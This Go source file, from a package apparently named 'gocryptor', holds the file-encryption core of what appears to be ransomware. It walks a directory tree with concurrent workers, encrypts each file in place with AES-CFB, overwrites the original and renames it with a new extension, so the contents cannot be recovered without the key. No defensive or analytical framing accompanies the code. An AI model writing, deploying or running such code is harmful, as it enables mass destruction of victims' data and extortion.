package gocryptor

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"os"
	"sync"
)

func EncryptDir(root string, key string) error {
	files, err := enumFiles(root)
	if err != nil {
		return err
	}

	pathCh := make(chan string, workerNum)
	wg := sync.WaitGroup{}
	for i := 0; i < workerNum; i++ {
		wg.Add(1)
		go encryptWorker(pathCh, key, &wg)
	}

	for _, file := range files {
		pathCh <- file
	}
	close(pathCh)
	wg.Wait()
	return nil
}

func encryptWorker(ch chan string, key string, wg *sync.WaitGroup) {
	defer wg.Done()
	for {
		path, ok := <-ch
		if !ok {
			break
		}
		fmt.Println(path)
		err := EncryptFile(path, key)
		if err != nil {
			log.Println(err)
		}
	}
	return
}

func EncryptFile(filename string, key string) error {
	data, err := ioutil.ReadFile(filename)
	if err != nil {
		return err
	}

	data, err = AESencode(data, key)
	if err != nil {
		return err
	}

	err = ioutil.WriteFile(filename, data, 555)
	if err != nil {
		return err
	}
	os.Rename(filename, filename+newExtention)
	return nil
}

func AESencode(data []byte, key string) ([]byte, error) {
	keyByte := []byte(key)
	block, err := aes.NewCipher(keyByte)
	if err != nil {
		return nil, err
	}

	cipherData := make([]byte, aes.BlockSize+len(data))
	initVec := cipherData[:aes.BlockSize]
	_, err = io.ReadFull(rand.Reader, initVec)
	if err != nil {
		return nil, err
	}

	stream := cipher.NewCFBEncrypter(block, initVec)
	stream.XORKeyStream(cipherData[aes.BlockSize:], data)
	return cipherData, nil
}
